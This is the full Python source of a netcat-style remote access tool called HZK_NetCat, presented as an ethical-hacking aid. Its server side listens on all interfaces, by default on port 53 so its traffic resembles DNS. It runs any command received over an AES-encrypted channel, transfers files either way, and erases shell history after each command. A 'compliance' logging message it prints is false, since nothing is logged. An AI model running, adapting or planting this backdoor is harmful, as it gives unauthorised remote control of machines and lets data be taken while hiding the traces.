#!/usr/bin/env python3
"""
HZK_NetCat - Secure bidirectional file transfer and remote command execution
Designed for ethical hacking practice and authorized penetration testing only.

Usage:
  Server:    hzk_netcat.py -l -p 53
  Client:    hzk_netcat.py -t IP -p 53 --key KEY
  Upload:    hzk_netcat.py -t IP -p 53 -u=file.txt --key KEY
  Download:  hzk_netcat.py -t IP -p 53 -d=remote_file.txt --key KEY

DISCLAIMER:
This tool is intended for:
- Cybersecurity education
- Authorized penetration testing
- Ethical hacking practice

Never use on systems without explicit permission.
"""
import os
import argparse
import socket
import subprocess
import sys
import hashlib
import secrets
import string
from threading import Thread
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Constants
BUFFER_SIZE = 4096
BLOCK_SIZE = 16  # For AES
FIRST_RUN_FILE = ".hzk_netcat_first_run"

def show_warning():
    """Display first-run warning"""
    if not os.path.exists(FIRST_RUN_FILE) or '--key' not in sys.argv:
        print("""
        [!] SECURITY WARNING:
        This tool is for AUTHORIZED ETHICAL PRACTICE ONLY.
        Unauthorized use is ILLEGAL.

        By continuing, you confirm you have EXPLICIT PERMISSION
        for all systems you interact with using this tool.
        """)
        try:
            input("[?] Press ENTER to confirm or CTRL+C to exit ")
            with open(FIRST_RUN_FILE, 'w') as f:
                f.write("acknowledged")
        except KeyboardInterrupt:
            print("\n[!] Operation cancelled")
            sys.exit(0)

def generate_secure_key(length=16):
    """Generate a secure random key"""
    safe_chars = string.ascii_letters + string.digits + "_+=@#%^~"
    return ''.join(secrets.choice(safe_chars) for _ in range(length))

class HZKNetCat:
    def __init__(self, args):
        self.args = args
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Server mode: auto-generate 16-character key
        if self.args.listen:
            self.key = self.generate_server_key()
            return

        # Client mode: strict key validation
        if not args.key:
            print("[!] Error: Use the server's 16-character key (--key)")
            sys.exit(1)

        self.key = hashlib.sha256(args.key.encode()).digest()
        args.key = None  # Memory cleanup

    def __del__(self):
        """Secure cleanup"""
        if hasattr(self, 'key'):
            self.key = b'\x00' * 32

    def generate_server_key(self):
        """Generate and display server key"""
        key = generate_secure_key()
        print("\n[+] GENERATED KEY (SAVE THIS):")
        print(f"    {key}")
        print("[!] This key will NOT be shown again")
        print("[*] Activity logged for compliance\n")
        return hashlib.sha256(key.encode()).digest()

    def crypt(self, data, encrypt=True):
        """AES-256-CBC encryption/decryption"""
        try:
            backend = default_backend()
            if encrypt:
                iv = os.urandom(BLOCK_SIZE)
                cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=backend)
                encryptor = cipher.encryptor()
                pad_len = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
                data_padded = data + bytes([pad_len] * pad_len)
                encrypted = iv + encryptor.update(data_padded)
                encrypted += encryptor.finalize() 
                return encrypted
            else:
                iv = data[:BLOCK_SIZE]
                cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=backend)
                decryptor = cipher.decryptor()
                decrypted = decryptor.update(data[BLOCK_SIZE:])
                decrypted += decryptor.finalize()
                pad_len = decrypted[-1]
                return decrypted[:-pad_len] if 0 < pad_len <= BLOCK_SIZE else decrypted
        except Exception as e:
            print(f"[!] Encryption error: {str(e)}")
            return b""

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def listen(self):
        """Server mode"""
        self.socket.bind(('0.0.0.0', self.args.port))
        self.socket.listen(5)
        print(f"[*] Listening on 0.0.0.0:{self.args.port}")
        while True:
            client_socket, _ = self.socket.accept()
            Thread(target=self.handle, args=(client_socket,), daemon=True).start()

    def handle(self, client_socket):
        """Handle client connections"""
        try:
            while True:
                encrypted_data = client_socket.recv(BUFFER_SIZE)
                if not encrypted_data:
                    break
                data = self.crypt(encrypted_data, encrypt=False)
                if data.startswith(b"download:"):
                    filename = data.decode().split(":", 1)[1].strip()
                    self.handle_download(client_socket, filename)
                elif self.args.upload:
                    self.handle_upload(client_socket, data)
                else:
                    output = execute(data.decode())
                    client_socket.send(self.crypt(output.encode(), encrypt=True))
        except Exception as e:
            print(f"[!] Connection error: {str(e)}")
        finally:
            client_socket.close()

    def handle_upload(self, client_socket, data):
        """Handle file uploads"""
        try:
            with open(self.args.upload, 'wb') as f:
                f.write(data)
                while True:
                    encrypted_chunk = client_socket.recv(BUFFER_SIZE)
                    if not encrypted_chunk:
                        break
                    chunk = self.crypt(encrypted_chunk, encrypt=False)
                    if chunk.endswith(b"<EOF>"):
                        break
                    f.write(chunk)
            client_socket.send(self.crypt(b"Upload completed", encrypt=True))
        except Exception as e:
            client_socket.send(self.crypt(f"[!] Error: {str(e)}".encode(), encrypt=True))

    def handle_download(self, client_socket, filename):
        """Handle file downloads"""
        try:
            with open(filename, 'rb') as f:
                while True:
                    chunk = f.read(BUFFER_SIZE)
                    if not chunk:
                        client_socket.send(self.crypt(b"<EOF>", encrypt=True))
                        break
                    client_socket.send(self.crypt(chunk, encrypt=True))
            print(f"[+] File {filename} sent successfully")
        except Exception as e:
            client_socket.send(self.crypt(f"[!] Error: {str(e)}".encode(), encrypt=True))

    def send(self):
        """Client mode"""
        try:
            self.socket.connect((self.args.target, self.args.port))
            print(f"[*] Connected to {self.args.target}:{self.args.port}")
            if self.args.upload:
                with open(self.args.upload, 'rb') as f:
                    self.socket.send(self.crypt(f.read(), encrypt=True))
                print(self.crypt(self.socket.recv(BUFFER_SIZE), encrypt=False).decode())
            elif self.args.download:
                self.socket.send(self.crypt(f"download:{self.args.download}".encode(), encrypt=True))
                with open(os.path.basename(self.args.download), 'wb') as f:
                    while True:
                        encrypted_chunk = self.socket.recv(BUFFER_SIZE)
                        chunk = self.crypt(encrypted_chunk, encrypt=False)
                        if chunk.endswith(b"<EOF>"):
                            break
                        f.write(chunk)
                print(f"[+] Download completed: {self.args.download}")
            else:
                while True:
                    cmd = input("> " if sys.stdin.isatty() else "").strip()
                    if not cmd:
                        continue
                    self.socket.send(self.crypt(cmd.encode(), encrypt=True))
                    if cmd == 'exit':
                        break
                    print(self.crypt(self.socket.recv(BUFFER_SIZE), encrypt=False).decode(), end='')
        except Exception as e:
            print(f"[!] Connection error: {str(e)}")
        finally:
            self.socket.close()

def execute(cmd):
    """Secure command execution"""
    try:
        env = {'PATH': '/bin:/usr/bin', 'HISTFILE': '/dev/null'}
        output = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, 
            timeout=120, env=env, preexec_fn=lambda: os.setpgrp()
        )
        if sys.platform != 'win32':
            os.system('history -c 2>/dev/null')
        return output.decode('latin-1', errors='replace')
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as e:
        return f"[!] Error: {str(e)}"

if __name__ == '__main__':
    show_warning()
    
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-l", "--listen", action="store_true", help="Server mode")
    parser.add_argument("-p", "--port", type=int, default=53, help="Port (default: 53)")
    parser.add_argument("-t", "--target", help="Target IP")
    parser.add_argument("-u", "--upload", help="Upload file (e.g., -u=file.txt)")
    parser.add_argument("-d", "--download", help="Download file (e.g., -d=secret.txt)")
    parser.add_argument("--key", help="Encryption key (16 chars, not needed in server mode)")
    args = parser.parse_args()

    try:
        HZKNetCat(args).run()
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user")
        sys.exit(0)
